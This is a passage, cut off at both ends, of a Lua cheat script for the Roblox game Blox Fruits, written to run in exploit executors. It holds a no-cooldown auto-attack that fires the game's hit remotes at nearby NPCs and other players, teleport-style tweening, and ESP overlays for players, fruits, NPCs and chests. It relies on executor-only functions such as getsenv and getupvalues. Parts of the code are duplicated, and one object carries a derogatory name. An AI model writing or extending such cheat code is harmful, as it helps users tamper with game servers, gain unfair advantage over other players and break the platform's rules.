                'Royal Soldier',
                'Wysper',
                'Thunder God'
            }
            MPos = CFrame.new(- 4698, 845, - 1912)
            SP = 'Default'
            local u = Vector3.new(- 4607.82275, 872.54248, - 1667.55688)
            shouldRequestEntrance(u, 10000)
        elseif SelectMaterial == 'Leather + Scrap Metal' then
            MMon = {
                'Brute',
                'Pirate'
            }
            MPos = CFrame.new(- 1145, 15, 4350)
            SP = 'Default'
        elseif SelectMaterial == 'Magma Ore' then
            MMon = {
                'Military Soldier',
                'Military Spy',
                'Magma Admiral'
            }
            MPos = CFrame.new(- 5815, 84, 8820)
            SP = 'Default'
        elseif SelectMaterial == 'Fish Tail' then
            MMon = {
                'Fishman Warrior',
                'Fishman Commando',
                'Fishman Lord'
            }
            MPos = CFrame.new(61123, 19, 1569)
            SP = 'Default'
            local u = Vector3.new(61163.8515625, 5.342342376708984, 1819.7841796875)
            shouldRequestEntrance(u, 17000)
        end
    elseif World2 then
        if SelectMaterial == 'Leather + Scrap Metal' then
            MMon = {
                'Marine Captain'
            }
            MPos = CFrame.new(- 2010.5059814453125, 73.00115966796875, - 3326.620849609375)
            SP = 'Default'
        elseif SelectMaterial == 'Magma Ore' then
            MMon = {
                'Magma Ninja',
                'Lava Pirate'
            }
            MPos = CFrame.new(- 5428, 78, - 5959)
            SP = 'Default'
        elseif SelectMaterial == 'Ectoplasm' then
            MMon = {
                'Ship Deckhand',
                'Ship Engineer',
                'Ship Steward',
                'Ship Officer'
            }
            MPos = CFrame.new(911.35827636719, 125.95812988281, 33159.5390625)
            SP = 'Default'
            local u = Vector3.new(61163.8515625, 5.342342376708984, 1819.7841796875)
            shouldRequestEntrance(u, 18000)
        elseif SelectMaterial == 'Mystic Droplet' then
            MMon = {
                'Water Fighter'
            }
            MPos = CFrame.new(- 3385, 239, - 10542)
            SP = 'Default'
        elseif SelectMaterial == 'Radioactive Material' then
            MMon = {
                'Factory Staff'
            }
            MPos = CFrame.new(295, 73, - 56)
            SP = 'Default'
        elseif SelectMaterial == 'Vampire Fang' then
            MMon = {
                'Vampire'
            }
            MPos = CFrame.new(- 6033, 7, - 1317)
            SP = 'Default'
        end
    elseif World3 then
        if SelectMaterial == 'Scrap Metal' then
            MMon = {
                'Jungle Pirate',
                'Forest Pirate'
            }
            MPos = CFrame.new(- 11975.78515625, 331.7734069824219, - 10620.0302734375)
            SP = 'Default'
        elseif SelectMaterial == 'Fish Tail' then
            MMon = {
                'Fishman Raider',
                'Fishman Captain'
            }
            MPos = CFrame.new(- 10993, 332, - 8940)
            SP = 'Default'
        elseif SelectMaterial == 'Conjured Cocoa' then
            MMon = {
                'Chocolate Bar Battler',
                'Cocoa Warrior'
            }
            MPos = CFrame.new(620.6344604492188, 78.93644714355469, - 12581.369140625)
            SP = 'Default'
        elseif SelectMaterial == 'Dragon Scale' then
            MMon = {
                'Dragon Crew Archer',
                'Dragon Crew Warrior'
            }
            MPos = CFrame.new(6594, 383, 139)
            SP = 'Default'
        elseif SelectMaterial == 'Gunpowder' then
            MMon = {
                'Pistol Billionaire'
            }
            MPos = CFrame.new(- 84.8556900024414, 85.62061309814453, 6132.0087890625)
            SP = 'Default'
        elseif SelectMaterial == 'Mini Tusk' then
            MMon = {
                'Mythological Pirate'
            }
            MPos = CFrame.new(- 13545, 470, - 6917)
            SP = 'Default'
        elseif SelectMaterial == 'Demonic Wisp' then
            MMon = {
                'Demonic Soul'
            }
            MPos = CFrame.new(- 9495.6806640625, 453.58624267578125, 5977.3486328125)
            SP = 'Default'
        end
    end
end
QuestNeta = function()
    local s = QuestCheck()
    return {
        [1] = Mon,
        [2] = Qdata,
        [3] = Qname,
        [4] = PosM,
        [5] = NameMon,
        [6] = PosQ
    }
end


-- Auto Attack Function
local _v1 = game.Players.LocalPlayer

-- Use getgenv() to make variables accessible across scripts
getgenv().FastAttack = true

function _x1()
    local _v2 = _v1.Character
    if not _v2 then return end

    local _v3 = nil
    for _, _v4 in ipairs(_v2:GetChildren()) do
        if _v4:IsA("Tool") then
            _v3 = _v4
            break
        end
    end
    if not _v3 then return end

    local function _x2(_v5)
        return _v5 and _v5:FindFirstChild("Humanoid") and _v5.Humanoid.Health > 0
    end

    -- Modified function to get both enemies and players
    local function _x3(_v6)
        local targets = {}
        local _v9 = _v2:GetPivot().Position
        
        -- Get enemies
        if workspace:FindFirstChild("Enemies") then
            local _v7 = workspace.Enemies:GetChildren()
            for _, _v10 in ipairs(_v7) do
                local _v11 = _v10:FindFirstChild("HumanoidRootPart")
                if _v11 and _x2(_v10) and (_v11.Position - _v9).Magnitude <= _v6 then
                    table.insert(targets, _v10)
                end
            end
        end
        
        -- Get players (excluding yourself)
        for _, player in ipairs(game.Players:GetPlayers()) do
            if player ~= _v1 and player.Character then
                local hrp = player.Character:FindFirstChild("HumanoidRootPart")
                if hrp and _x2(player.Character) and (hrp.Position - _v9).Magnitude <= _v6 then
                    table.insert(targets, player.Character)
                end
            end
        end
        
        return targets
    end

    if _v3:FindFirstChild("LeftClickRemote") then
        local _v12 = 1  
        local _v13 = _x3(60)
        for _, _v14 in ipairs(_v13) do
            local hrp = _v14:FindFirstChild("HumanoidRootPart")
            if hrp then
                local _v15 = (hrp.Position - _v2:GetPivot().Position).Unit
                pcall(function()
                    _v3.LeftClickRemote:FireServer(_v15, _v12)
                end)
                _v12 = _v12 + 1
                if _v12 > 1000000000 then _v12 = 1 end
            end
        end
    else
        local _v16 = {}
        local _v18 = _v2:GetPivot().Position
        local _v19 = nil
        
        -- Get both enemies and players as targets
        local _v13 = _x3(60)
        
        for _, _v20 in ipairs(_v13) do
            -- Skip boats if in enemies folder
            if not _v20:GetAttribute("IsBoat") and _x2(_v20) then
                local _v21 = _v20:FindFirstChild("Head")
                if _v21 and (_v18 - _v21.Position).Magnitude <= 60 then
                    table.insert(_v16, { _v20, _v21 })
                    _v19 = _v21
                end
            end
        end

        if not _v19 then return end

        pcall(function()
            local _v22 = game:GetService("ReplicatedStorage")
            local _v23 = _v22:WaitForChild("Modules"):WaitForChild("Net"):WaitForChild("RE/RegisterAttack")
            local _v24 = _v22:WaitForChild("Modules"):WaitForChild("Net"):WaitForChild("RE/RegisterHit")
            
            if #_v16 > 0 then
                _v23:FireServer(0.000000001)
                _v24:FireServer(_v19, _v16)
            else
                task.wait(0.000000001)
            end
        end)
    end
end

getgenv().FastAttack = true

spawn(function()
    while wait(.1) do
        if getgenv().FastAttack then
            pcall(function()
                repeat task.wait(0.1)
                    _x1()
                until not getgenv().FastAttack
            end)
        end
    end
end)


task.spawn(function()
    RunSer.Heartbeat:Connect(function()
        pcall(function()
            if not _G.Seriality then
                return
            end
            local executor = string.lower(identifyexecutor())
            if  (string.find(executor, "xeno") or string.find(executor, "solara")) then
                shitexecattack()
            else
                AttackNoCoolDown()
            end

            local ci = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Tool')
            local cj = ci.ToolTip
            local ck, cl = get_Monster()
            if cj == 'Blox Fruit' then
                if ck then
                    local cm = ci:FindFirstChild('LeftClickRemote')
                    if cm then
                        Actived()
                        cm:FireServer(Vector3.new(0.01, - 500, 0.01), 1, true)
                        cm:FireServer(false)
                    end
                end
            end
        end)
    end)
end)

local ch = game.Players.LocalPlayer
local function IsEntityAlive(ci)
    if not ci then
        return false
    end
    local cj = ci:FindFirstChild('Humanoid')
    return cj and cj.Health > 0
end
local function GetEnemiesInRange(ci, cj)
    local ck = game:GetService('Workspace').Enemies:GetChildren()
    local cl = game:GetService('Players'):GetPlayers()
    local cm = {}
    local cn = ci:GetPivot().Position
    for co, cp in ipairs(ck) do
        local cq = cp:FindFirstChild('HumanoidRootPart')
        if cq and IsEntityAlive(cp) and isnetworkowner(cq) then
            local cr = (cq.Position - cn).Magnitude
            if cr <= cj then
                table.insert(cm, cp)
            end
        end
    end
    for co, cp in ipairs(cl) do
        if cp ~= ch and cp.Character then
            local cq = cp.Character:FindFirstChild('HumanoidRootPart')
            if cq and IsEntityAlive(cp.Character) then
                local cr = (cq.Position - cn).Magnitude
                if cr <= cj then
                    table.insert(cm, cp.Character)
                end
            end
        end
    end
    return cm
end
local executor = string.lower(identifyexecutor())
if string.find(executor, "xeno") or string.find(executor, "solara") then
    warn("BAD EXEC REMOVING No Cooldown attakcs")
else
function AttackNoCoolDown()
    local ci = game:GetService('Players').LocalPlayer
    local cj = ci.Character
    if not cj then
        return
    end
    local ck = nil
    for cl, cm in ipairs(cj:GetChildren()) do
        if cm:IsA('Tool') then
            ck = cm
            break
        end
    end
    if not ck then
        return
    end
    local cl = GetEnemiesInRange(cj, 60)
    if # cl == 0 then
        return
    end
    local cm = game:GetService('ReplicatedStorage')
    local cn = cm:FindFirstChild('Modules')
    if not cn then
        return
    end
    local co = cm:WaitForChild('Modules'):WaitForChild('Net'):WaitForChild('RE/RegisterAttack')
    local cp = cm:WaitForChild('Modules'):WaitForChild('Net'):WaitForChild('RE/RegisterHit')
    if not co or not cp then
        return
    end
    local cq, cr = {}, nil
    for cs, ct in ipairs(cl) do
        if not ct:GetAttribute('IsBoat') then
            local cu = {
                'RightLowerArm',
                'RightUpperArm',
                'LeftLowerArm',
                'LeftUpperArm',
                'RightHand',
                'LeftHand'
            }
            local cv = ct:FindFirstChild(cu[math.random(# cu)]) or ct.PrimaryPart
            if cv then
                table.insert(cq, {
                    ct,
                    cv
                })
                cr = cv
            end
        end
    end
    if not cr then
        return
    end
    co:FireServer(0)
    local cs = ci:FindFirstChild('PlayerScripts')
    if not cs then
        return
    end
    local ct = cs:FindFirstChildOfClass('LocalScript')
    while not ct do
        cs.ChildAdded:Wait()
        ct = cs:FindFirstChildOfClass('LocalScript')
    end
    local cu
    if getsenv then
        local cv, cw = pcall(getsenv, ct)
        if cv and cw then
            cu = cw._G.SendHitsToServer
        end
    end
       
    local cv, cw = pcall(function()
        return require(cn.Flags).COMBAT_REMOTE_THREAD or false
    end)

    if cv and cw and cu then
        cu(cr, cq)
    elseif cv and not cw then
        cp:FireServer(cr, cq)
    end

end
end
local executor = string.lower(identifyexecutor())
if string.find(executor, "xeno") or string.find(executor, "solara") then
    warn("REMOVING ANTI CAMERA SHAKE")
else
CameraShakerR = require(game.ReplicatedStorage.Util.CameraShaker)
CameraShakerR:Stop()
end
get_Monster = function()
    for ci, cj in pairs(workspace.Enemies:GetChildren()) do
        local ck = cj:FindFirstChild('UpperTorso') or cj:FindFirstChild('Head')
        if cj:FindFirstChild('HumanoidRootPart', true) and ck then
            if (cj.Head.Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 70 then
                return true, ck.Position
            end
        end
    end
    for ci, cj in pairs(workspace.SeaBeasts:GetChildren()) do
        if cj:FindFirstChild('HumanoidRootPart') and cj:FindFirstChild('Health') and cj.Health.Value > 0 then
            return true, cj.HumanoidRootPart.Position
        end
    end
    for ci, cj in pairs(workspace.Enemies:GetChildren()) do
        if cj:FindFirstChild('Health') and cj.Health.Value > 0 and cj:FindFirstChild('VehicleSeat') then
            return true, cj.Engine.Position
        end
    end
end
Actived = function()
    local ci = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Tool')
    for cj, ck in next, getconnections(ci.Activated) do
        if typeof(ck.Function) == 'function' then
            getupvalues(ck.Function)
        end
    end
end

function shitexecattack()
    local ch = game.Players.LocalPlayer
local function IsEntityAlive(ci)
    if not ci then
        return false
    end
    local cj = ci:FindFirstChild('Humanoid')
    return cj and cj.Health > 0
end

local function GetEnemiesInRange(ci, cj)
    local ck = game:GetService('Workspace').Enemies:GetChildren()
    local cl = game:GetService('Players'):GetPlayers()
    local cm = {}
    local cn = ci:GetPivot().Position
    for co, cp in ipairs(ck) do
        local cq = cp:FindFirstChild('HumanoidRootPart')
        if cq and IsEntityAlive(cp) and isnetworkowner(cq) then
            local cr = (cq.Position - cn).Magnitude
            if cr <= cj then
                table.insert(cm, cp)
            end
        end
    end
    for co, cp in ipairs(cl) do
        if cp ~= ch and cp.Character then
            local cq = cp.Character:FindFirstChild('HumanoidRootPart')
            if cq and IsEntityAlive(cp.Character) then
                local cr = (cq.Position - cn).Magnitude
                if cr <= cj then
                    table.insert(cm, cp.Character)
                end
            end
        end
    end
    return cm
end

local player = game:GetService('Players').LocalPlayer
local character = player.Character
if not character then return end

local tool
for _, child in ipairs(character:GetChildren()) do
    if child:IsA('Tool') then
        tool = child
        break
    end
end
if not tool then return end

local enemies = GetEnemiesInRange(character, 60)
if #enemies == 0 then return end

local replicatedStorage = game:GetService('ReplicatedStorage')
local modules = replicatedStorage:FindFirstChild('Modules')
if not modules then return end

local registerAttack = game:GetService("ReplicatedStorage").Modules.Net["RE/RegisterAttack"]
local registerHit = game:GetService("ReplicatedStorage").Modules.Net["RE/RegisterHit"]

if not registerAttack or not registerHit then return end

local targets = {}
local targetPart = nil
for _, enemy in ipairs(enemies) do
    if not enemy:GetAttribute('IsBoat') then
        local bodyParts = {
            'RightLowerArm', 'RightUpperArm',
            'LeftLowerArm', 'LeftUpperArm',
            'RightHand', 'LeftHand'
        }
        local chosenPart = enemy:FindFirstChild(bodyParts[math.random(#bodyParts)]) or enemy.PrimaryPart
        if chosenPart then
            table.insert(targets, {enemy, chosenPart})
            targetPart = chosenPart
        end
    end
end

if not targetPart then return end

registerAttack:FireServer(0)

local playerScripts = player:FindFirstChild('PlayerScripts')
local localScript = playerScripts and playerScripts:FindFirstChildOfClass('LocalScript')
if not localScript then return end

local sendHits
if getsenv then
    local success, env = pcall(getsenv, localScript)
    if success and env and env._G and env._G.SendHitsToServer then
        sendHits = env._G.SendHitsToServer
    end
end

if sendHits then
    sendHits(targetPart, targets)
else
    registerHit:FireServer(targetPart, targets)
end

end

task.spawn(function()
    RunSer.Heartbeat:Connect(function()
        pcall(function()
            if not _G.Seriality then
                return
            end
            local executor = string.lower(identifyexecutor())
            if  (string.find(executor, "xeno") or string.find(executor, "solara")) then
                shitexecattack()
            else
                AttackNoCoolDown()
            end

            local ci = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Tool')
            local cj = ci.ToolTip
            local ck, cl = get_Monster()
            if cj == 'Blox Fruit' then
                if ck then
                    local cm = ci:FindFirstChild('LeftClickRemote')
                    if cm then
                        Actived()
                        cm:FireServer(Vector3.new(0.01, - 500, 0.01), 1, true)
                        cm:FireServer(false)
                    end
                end
            end
        end)
    end)
end)
local ci = workspace:FindFirstChild('Rocks')
if ci then
    ci:Destroy()
end

TweenSpeed = 350;

function Tween3(targetCFrame)
    if isTweening then return end
    if not targetCFrame then
        if tween then pcall(function() tween:Cancel() end) tween = nil end
        if connection then pcall(function() connection:Disconnect() end) connection = nil end
        return
    end

    local char = game.Players.LocalPlayer.Character
    if not char then return end

    local root = char:FindFirstChild("HumanoidRootPart")
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if not root or not humanoid then return end
    if humanoid.Sit then humanoid.Sit = false end

    local distance = (targetCFrame.Position - root.Position).Magnitude

    local pathPart = Instance.new("Part")
    pathPart.Name = "TweenGhost"
    pathPart.Transparency = 1
    pathPart.Anchored = true
    pathPart.CanCollide = false
    pathPart.CFrame = root.CFrame
    pathPart.Parent = workspace

    local tweenTime = distance / TweenSpeed
    tween = game:GetService("TweenService"):Create(pathPart, TweenInfo.new(tweenTime, Enum.EasingStyle.Linear), {CFrame = targetCFrame})

    isTweening = true
    connection = game:GetService("RunService").Heartbeat:Connect(function()
        if root and pathPart then root.CFrame = pathPart.CFrame end
    end)

    tween:Play()
    tween.Completed:Connect(function()
        if connection then connection:Disconnect() connection = nil end
        if pathPart then pathPart:Destroy() end
        tween = nil
        isTweening = false
    end)

    if _G.StopTween then
        tween:Cancel()
    end
end

function Tween2(v204)

local v205 = (v204.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude;

local v206 = 350;

if (v205 >= 350) then

v206 = 350;

end

local v207 = TweenInfo.new(v205 / v206, Enum.EasingStyle.Linear);

local v208 = game:GetService("TweenService"):Create(game.Players.LocalPlayer.Character.HumanoidRootPart, v207, {

CFrame = v204

});

v208:Play();

if _G.CancelTween2 then

v208:Cancel();

end

_G.Clip2 = true;

wait(v205 / v206);

_G.Clip2 = false;

end

function isnil(cd)
    return (cd == nil)
end
local function round(cd)
    return math.floor(tonumber(cd) + 0.5)
end
Number = math.random(1, 1000000)
EspPly = function()
    for cd, ce in next, game.Players:GetChildren() do
        pcall(function()
            if not isnil(ce.Character) then
                if PlayerEsp then
                    if not isnil(ce.Character.Head) and not ce.Character.Head:FindFirstChild('NameEsp' .. Number) then
                        local cf = Instance.new('BillboardGui', ce.Character.Head)
                        cf.Name = 'NameEsp' .. Number
                        cf.ExtentsOffset = Vector3.new(0, 1, 0)
                        cf.Size = UDim2.new(1, 200, 1, 30)
                        cf.Adornee = ce.Character.Head
                        cf.AlwaysOnTop = true
                        local cg = Instance.new('TextLabel', cf)
                        cg.Font = Enum.Font.Code
                        cg.FontSize = 'Size14'
                        cg.TextWrapped = true
                        cg.Text = (ce.Name .. ' \n' .. round((game:GetService('Players').LocalPlayer.Character.Head.Position - ce.Character.Head.Position).Magnitude / 3) .. ' M')
                        cg.Size = UDim2.new(1, 0, 1, 0)
                        cg.TextYAlignment = 'Top'
                        cg.BackgroundTransparency = 1
                        cg.TextStrokeTransparency = 0.5
                        if ce.Team == TeamSelf then
                            cg.TextColor3 = Color3.new(1, 1, 1)
                        else
                            cg.TextColor3 = Color3.new(1, 1, 1)
                        end
                    else
                        ce.Character.Head['NameEsp' .. Number].TextLabel.Text = (ce.Data.Level.Value .. ' | ' .. ce.Name .. ' | ' .. round((game:GetService('Players').LocalPlayer.Character.Head.Position - ce.Character.Head.Position).Magnitude / 3) .. ' M\nHealth : ' .. round(ce.Character.Humanoid.Health * 100 / ce.Character.Humanoid.MaxHealth) .. '%')
                    end
                else
                    if ce.Character.Head:FindFirstChild('NameEsp' .. Number) then
                        ce.Character.Head:FindFirstChild('NameEsp' .. Number):Destroy()
                    end
                end
            end
        end)
    end
end
LocationEsp = function()
    for cd, ce in next, workspace._WorldOrigin.Locations:GetChildren() do
        pcall(function()
            if IslandESP then
                if (ce.Name ~= 'Sea') then
                    if not ce:FindFirstChild('NameEsp') then
                        local cf = Instance.new('BillboardGui', ce)
                        cf.Name = 'NameEsp'
                        cf.ExtentsOffset = Vector3.new(0, 1, 0)
                        cf.Size = UDim2.new(1, 200, 1, 30)
                        cf.Adornee = ce
                        cf.AlwaysOnTop = true
                        local cg = Instance.new('TextLabel', cf)
                        cg.Font = Enum.Font.Code
                        cg.FontSize = 'Size14'
                        cg.TextWrapped = true
                        cg.Size = UDim2.new(1, 0, 1, 0)
                        cg.TextYAlignment = 'Top'
                        cg.BackgroundTransparency = 1
                        cg.TextStrokeTransparency = 0.5
                        cg.TextColor3 = Color3.fromRGB(98, 252, 252)
                    else
                        ce.NameEsp.TextLabel.Text = (ce.Name .. '   \n' .. round((game:GetService('Players').LocalPlayer.Character.Head.Position - ce.Position).Magnitude / 3) .. ' M')
                    end
                end
            else
                if ce:FindFirstChild('NameEsp') then
                    ce:FindFirstChild('NameEsp'):Destroy()
                end
            end
        end)
    end
end
DevEsp = function()
    for cd, ce in next, workspace:GetChildren() do
        pcall(function()
            if DevilFruitESP then
                if string.find(ce.Name, 'Fruit') then
                    if not ce.Handle:FindFirstChild('NameEsp' .. Number) then
                        local cf = Instance.new('BillboardGui', ce.Handle)
                        cf.Name = 'NameEsp' .. Number
                        cf.ExtentsOffset = Vector3.new(0, 1, 0)
                        cf.Size = UDim2.new(1, 200, 1, 30)
                        cf.Adornee = ce.Handle
                        cf.AlwaysOnTop = true
                        local cg = Instance.new('TextLabel', cf)
                        cg.Font = Enum.Font.Code
                        cg.FontSize = 'Size14'
                        cg.TextWrapped = true
                        cg.Size = UDim2.new(1, 0, 1, 0)
                        cg.TextYAlignment = 'Top'
                        cg.BackgroundTransparency = 1
                        cg.TextStrokeTransparency = 0.5
                        cg.TextColor3 = Color3.fromRGB(255, 255, 255)
                        cg.Text = (ce.Name .. ' \n' .. round((game:GetService('Players').LocalPlayer.Character.Head.Position - ce.Handle.Position).Magnitude / 3) .. ' M')
                    else
                        ce.Handle['NameEsp' .. Number].TextLabel.Text = ('[' .. ce.Name .. ']' .. '   \n' .. round((game:GetService('Players').LocalPlayer.Character.Head.Position - ce.Handle.Position).Magnitude / 3) .. ' M')
                    end
                end
            else
                if ce.Handle:FindFirstChild('NameEsp' .. Number) then
                    ce.Handle:FindFirstChild('NameEsp' .. Number):Destroy()
                end
            end
        end)
    end
end
flowerEsp = function()
    for cd, ce in pairs(workspace:GetChildren()) do
        pcall(function()
            if ce.Name == 'Flower2' or ce.Name == 'Flower1' then
                if FlowerESP then
                    if not ce:FindFirstChild('NameEsp' .. Number) then
                        local cf = Instance.new('BillboardGui', ce)
                        cf.Name = 'NameEsp' .. Number
                        cf.ExtentsOffset = Vector3.new(0, 1, 0)
                        cf.Size = UDim2.new(1, 200, 1, 30)
                        cf.Adornee = ce
                        cf.AlwaysOnTop = true
                        local cg = Instance.new('TextLabel', cf)
                        cg.Font = Enum.Font.Code
                        cg.FontSize = 'Size14'
                        cg.TextWrapped = true
                        cg.Size = UDim2.new(1, 0, 1, 0)
                        cg.TextYAlignment = 'Top'
                        cg.BackgroundTransparency = 1
                        cg.TextStrokeTransparency = 0.5
                        cg.TextColor3 = Color3.fromRGB(88, 214, 252)
                        if ce.Name == 'Flower1' then
                            cg.Text = ('Blue Flower' .. ' \n' .. round((game:GetService('Players').LocalPlayer.Character.Head.Position - ce.Position).Magnitude / 3) .. ' M')
                            cg.TextColor3 = Color3.fromRGB(88, 214, 252)
                        end
                        if ce.Name == 'Flower2' then
                            cg.Text = ('Red Flower' .. ' \n' .. round((game:GetService('Players').LocalPlayer.Character.Head.Position - ce.Position).Magnitude / 3) .. ' M')
                            cg.TextColor3 = Color3.fromRGB(88, 214, 252)
                        end
                    else
                        ce['NameEsp' .. Number].TextLabel.Text = (ce.Name .. '   \n' .. round((game:GetService('Players').LocalPlayer.Character.Head.Position - ce.Position).Magnitude / 3) .. ' M')
                    end
                else
                    if ce:FindFirstChild('NameEsp' .. Number) then
                        ce:FindFirstChild('NameEsp' .. Number):Destroy()
                    end
                end
            end
        end)
    end
end
EventIslandEsp = function()
    for cd, ce in pairs(workspace._WorldOrigin.Locations:GetChildren()) do
        pcall(function()
            if EspEventIsland then
                if (ce.Name == 'Mirage Island' or ce.Name == 'Prehistoric Island' or ce.Name == 'Kitsune Island') then
                    if not ce:FindFirstChild('NameEsp') then
                        local cf = Instance.new('BillboardGui', ce)
                        cf.Name = 'NameEsp'
                        cf.ExtentsOffset = Vector3.new(0, 1, 0)
                        cf.Size = UDim2.new(1, 200, 1, 30)
                        cf.Adornee = ce
                        cf.AlwaysOnTop = true
                        local cg = Instance.new('TextLabel', cf)
                        cg.Font = 'Code'
                        cg.FontSize = 'Size14'
                        cg.TextWrapped = true
                        cg.Size = UDim2.new(1, 0, 1, 0)
                        cg.TextYAlignment = 'Top'
                        cg.BackgroundTransparency = 1
                        cg.TextStrokeTransparency = 0.5
                        cg.TextColor3 = Color3.fromRGB(80, 245, 245)
                    else
                        ce.NameEsp.TextLabel.Text = ce.Name .. '   \n' .. round((plr.Character.Head.Position - ce.Position).Magnitude / 3) .. ' M'
                    end
                end
            elseif ce:FindFirstChild('NameEsp') then
                ce:FindFirstChild('NameEsp'):Destroy()
            end
        end)
    end
end
gearEsp = function()
    for cd, ce in pairs(workspace.Map.MysticIsland:GetDescendants()) do
        pcall(function()
            if ESPGear then
                if ce.Name == 'Part' and ce.Material == Enum.Material.Neon then
                    if not ce:FindFirstChild('NameEsp') then
                        local cf = Instance.new('BillboardGui', ce)
                        cf.Name = 'NameEsp'
                        cf.ExtentsOffset = Vector3.new(0, 1, 0)
                        cf.Size = UDim2.new(1, 200, 1, 30)
                        cf.Adornee = ce
                        cf.AlwaysOnTop = true
                        local cg = Instance.new('TextLabel', cf)
                        cg.Font = 'Code'
                        cg.FontSize = 'Size14'
                        cg.TextWrapped = true
                        cg.Size = UDim2.new(1, 0, 1, 0)
                        cg.TextYAlignment = 'Top'
                        cg.BackgroundTransparency = 1
                        cg.TextStrokeTransparency = 0.5
                        cg.TextColor3 = Color3.fromRGB(80, 245, 245)
                    else
                        ce.NameEsp.TextLabel.Text = ('Gear' .. '   \n' .. round((plr.Character.Head.Position - ce.Position).Magnitude / 3) .. ' M')
                    end
                end
            else
                if ce:FindFirstChild('NameEsp') then
                    ce:FindFirstChild('NameEsp'):Destroy()
                end
            end
        end)
    end
end
AdvanFruitEsp = function()
    if advanEsp == true then
        for cd, ce in pairs(replicated.NPCs:GetChildren()) do
            if ce.Name == 'Advanced Fruit Dealer' then
                if not workspace:FindFirstChild('Adv') then
                    Adv = Instance.new('Part')
                    Adv.Name = 'Adv'
                    Adv.Transparency = 1
                    Adv.Size = Vector3.new(1, 1, 1)
                    Adv.Anchored = true
                    Adv.CanCollide = false
                    Adv.Parent = workspace
                    Adv.CFrame = ce.HumanoidRootPart.CFrame
                elseif workspace:FindFirstChild('Adv') then
                    if not Adv:FindFirstChild('NameEsp') then
                        local cf = Instance.new('BillboardGui', Adv)
                        cf.Name = 'NameEsp'
                        cf.ExtentsOffset = Vector3.new(0, 1, 0)
                        cf.Size = UDim2.new(1, 200, 1, 30)
                        cf.Adornee = Adv
                        cf.AlwaysOnTop = true
                        local cg = Instance.new('TextLabel', cf)
                        cg.Font = 'Code'
                        cg.FontSize = 'Size14'
                        cg.TextWrapped = true
                        cg.Size = UDim2.new(1, 0, 1, 0)
                        cg.TextYAlignment = 'Top'
                        cg.BackgroundTransparency = 1
                        cg.TextStrokeTransparency = 0.5
                        cg.TextColor3 = Color3.fromRGB(80, 245, 245)
                    else
                        Adv.NameEsp.TextLabel.Text = (ce.Name .. '   \n' .. round((plr.Character.Head.Position - ce.HumanoidRootPart.Position).Magnitude / 3) .. ' M')
                    end
                end
            end
        end
    else
        if workspace:FindFirstChild('Adv') then
            workspace:FindFirstChild('Adv'):Destroy()
        end
    end
end
HakiClorEsp = function()
    if ColorEsp == true then
        for cd, ce in pairs(replicated.NPCs:GetChildren()) do
            if ce.Name == 'Barista Cousin' then
                if not workspace:FindFirstChild('Gay') then
                    Gay = Instance.new('Part')
                    Gay.Name = 'Gay'
                    Gay.Transparency = 1
                    Gay.Size = Vector3.new(1, 1, 1)
                    Gay.Anchored = true
                    Gay.CanCollide = false
                    Gay.Parent = workspace
                    Gay.CFrame = ce.HumanoidRootPart.CFrame
                elseif workspace:FindFirstChild('Gay') then
                    if not Gay:FindFirstChild('NameEsp') then
                        local cf = Instance.new('BillboardGui', Gay)
                        cf.Name = 'NameEsp'
                        cf.ExtentsOffset = Vector3.new(0, 1, 0)
                        cf.Size = UDim2.new(1, 200, 1, 30)
                        cf.Adornee = Gay
                        cf.AlwaysOnTop = true
                        local cg = Instance.new('TextLabel', cf)
                        cg.Font = 'Code'
                        cg.FontSize = 'Size14'
                        cg.TextWrapped = true
                        cg.Size = UDim2.new(1, 0, 1, 0)
                        cg.TextYAlignment = 'Top'
                        cg.BackgroundTransparency = 1
                        cg.TextStrokeTransparency = 0.5
                        cg.TextColor3 = Color3.fromRGB(80, 245, 245)
                    else
                        Gay.NameEsp.TextLabel.Text = (ce.Name .. '   \n' .. round((plr.Character.Head.Position - ce.HumanoidRootPart.Position).Magnitude / 3) .. ' M')
                    end
                end
            end
        end
    else
        if workspace:FindFirstChild('Gay') then
            workspace:FindFirstChild('Gay'):Destroy()
        end
    end
end
LegenSword = function()
    if LegenS == true then
        for cd, ce in pairs(replicated.NPCs:GetChildren()) do
            if ce.Name == 'Legendary Sword Dealer ' then
                if not workspace:FindFirstChild('Lgd') then
                    Lgd = Instance.new('Part')
                    Lgd.Name = 'Lgd'
                    Lgd.Transparency = 1
                    Lgd.Size = Vector3.new(1, 1, 1)
                    Lgd.Anchored = true
                    Lgd.CanCollide = false
                    Lgd.Parent = workspace
                    Lgd.CFrame = ce.HumanoidRootPart.CFrame
                elseif workspace:FindFirstChild('Lgd') then
                    if not Lgd:FindFirstChild('NameEsp') then
                        local cf = Instance.new('BillboardGui', Lgd)
                        cf.Name = 'NameEsp'
                        cf.ExtentsOffset = Vector3.new(0, 1, 0)
                        cf.Size = UDim2.new(1, 200, 1, 30)
                        cf.Adornee = Lgd
                        cf.AlwaysOnTop = true
                        local cg = Instance.new('TextLabel', cf)
                        cg.Font = 'Code'
                        cg.FontSize = 'Size14'
                        cg.TextWrapped = true
                        cg.Size = UDim2.new(1, 0, 1, 0)
                        cg.TextYAlignment = 'Top'
                        cg.BackgroundTransparency = 1
                        cg.TextStrokeTransparency = 0.5
                        cg.TextColor3 = Color3.fromRGB(80, 245, 245)
                    else
                        Lgd.NameEsp.TextLabel.Text = (ce.Name .. '   \n' .. round((plr.Character.Head.Position - ce.HumanoidRootPart.Position).Magnitude / 3) .. ' M')
                    end
                end
            end
        end
    else
        if workspace:FindFirstChild('Lgd') then
            workspace:FindFirstChild('Lgd'):Destroy()
        end
    end
end
ChestEsp = function()
    if ChestESP then
        local cd = game:GetService('CollectionService')
        local ce = game:GetService('Players')
        local cf = ce.LocalPlayer
        local cg = cf.Character or cf.CharacterAdded:Wait()
        local ch = cg:GetPivot().Position
        local ci = cd:GetTagged('_ChestTagged')
        for cj, ck in ipairs(ci) do
            local cl = false
            repeat
                if not SelectedIsland or ck:IsDescendantOf(SelectedIsland) then
                    if not ck:GetAttribute('IsDisabled') then
                        local cm
                        local cn, co = pcall(function()
                            return ck:GetPivot().Position
                        end)
                        if cn then
                            cm = co
                        elseif ck:IsA('BasePart') then
                            cm = ck.Position
                        else
                            cl = true
                            break
                        end
                        local cp = (cm - ch).Magnitude
                        local cq = ck:GetFullName():gsub('[^%w_]', '_')
